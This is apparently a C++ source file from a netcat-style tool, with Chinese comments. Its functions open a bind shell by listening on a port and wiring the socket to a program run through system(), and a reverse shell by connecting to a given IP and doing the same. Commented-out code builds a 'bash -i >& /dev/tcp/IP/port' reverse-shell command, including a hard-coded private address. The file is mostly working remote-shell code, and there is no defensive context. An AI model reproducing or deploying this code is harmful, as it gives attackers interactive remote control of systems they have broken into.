#include "exec.h"
#include "global.h"
#include <stdio.h>
#include <iostream>
#include <stdlib.h>
#include <string.h>
#include <string>

using namespace std;

typedef struct for_std  // 结构体，用于保存线程信息，方便通知线程退出
{
	int * clnt_sock_ptr;  // 套接字
	pthread_t pid, other_pid;  // 两个线程ID
}for_std;

void nf_exec_serv(char * ip, int port_start, char * filename)
{
    int serv_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	struct sockaddr_in serv_addr;
    memset(&serv_addr, 0, sizeof(serv_addr));  //每个字节都用0填充
    serv_addr.sin_family = AF_INET;  //使用IPv4地址
    serv_addr.sin_addr.s_addr = htons(INADDR_ANY);  //具体的IP地址
	serv_addr.sin_port = htons(port_start);  //端口
    bind(serv_sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr));

	//进入监听状态，等待用户发起请求
    listen(serv_sock, 20);
	struct sockaddr_in clnt_addr;
    socklen_t clnt_addr_size = sizeof(clnt_addr);
    int clnt_sock = accept(serv_sock, (struct sockaddr*)&clnt_addr, &clnt_addr_size);
	dup2(clnt_sock, 0);
    dup2(clnt_sock, 1);
    dup2(clnt_sock, 2);

    //cout << filename << endl;
    //execve(filename, NULL, NULL);
    system(filename);

    /*
    for_std local, remote;
    
    // 由于两个线程都对同一个套接字进行操作，因此local.clnt_sock_ptr与remote.clnt_sock_ptr一样
	local.clnt_sock_ptr = &clnt_sock;
	remote.clnt_sock_ptr = &clnt_sock;

    // 创建两个线程
	pthread_create(&local.pid, NULL, std_local_exec, (void *)&local);
	pthread_create(&remote.pid, NULL, std_remote_exec, (void *)&remote);

    // 告诉当前线程另一个线程的ID是多少
	remote.other_pid = local.pid;
	local.other_pid = remote.pid;

    // 等待线程退出
	pthread_join(local.pid,NULL);
	pthread_join(remote.pid,NULL);

    // 关闭套接字，释放系统资源
	close(serv_sock);
	close(clnt_sock);
    //bash -i >& /dev/tcp/192.168.146.129/2333 <&2
    /*
    char cmd[1024] = {0};
    char port[6] = {0};
    //itoa(port_start, port, 10);
    snprintf(port, sizeof(cmd), "%d", port_start);
    sprintf(cmd, "%s -i >& /dev/tcp/%s/%s <&2", filename, ip, port);
    system(cmd);
    */
	return;
}

void nf_exec_clen(char * ip, int port_start, char * filename)
{
    /*
    char cmd[1024] = {0};
    char port[6] = {0};
    //itoa(port_start, port, 10);
    snprintf(port, sizeof(cmd), "%d", port_start);
    sprintf(cmd, "%s -i >& /dev/tcp/%s/%s <&2", filename, ip, port);
    system(cmd);
    */
    int clnt_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    struct sockaddr_in serv_addr;
    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = inet_addr(ip);
    serv_addr.sin_port = htons(port_start);
    connect(clnt_sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr));
    dup2(clnt_sock, 0);
    dup2(clnt_sock, 1);
    dup2(clnt_sock, 2);
    system(filename);
	return;
}


void * std_local_exec(void * clnt_sock)
{
	for_std * sock = (for_std *)clnt_sock;
	struct tcp_info info;
	int len = sizeof(info);
	char buff[1024];
	memset(buff, 0, 1024);
	while(1)
	{
		getsockopt(*sock->clnt_sock_ptr, IPPROTO_TCP, TCP_INFO, (void *)&info, (socklen_t *)&len);
		if(!(info.tcpi_state==TCP_ESTABLISHED))  // 连接已经断开
		{
			pthread_cancel(sock->other_pid);
			break;
		}
		read(*sock->clnt_sock_ptr, buff, sizeof(buff));
		//fputs(stdout, 256 - 1, buff);
		fputs(buff, stdout);
		//cout << buff;
		memset(buff, 0, 1024);
	}
	return NULL;
}


void * std_remote_exec(void * clnt_sock)
{
	char buff[1024];
	memset(buff, 0, 1024);
	for_std * sock = (for_std *)clnt_sock;
	while(1)
	{
		//cin >> buff;
		//gets(buff);
		fgets(buff, 256 - 1, stdin);
		/*
		if(buff[0] == 0x0a)
		{
			continue;
		}
		*/
		if(strlen(buff) == 0)
		{
			continue;
		}
		sprintf(buff, "%s", buff);
		write(*sock->clnt_sock_ptr, buff, strlen(buff));
		memset(buff, 0, 1024);
	}
	return NULL;
}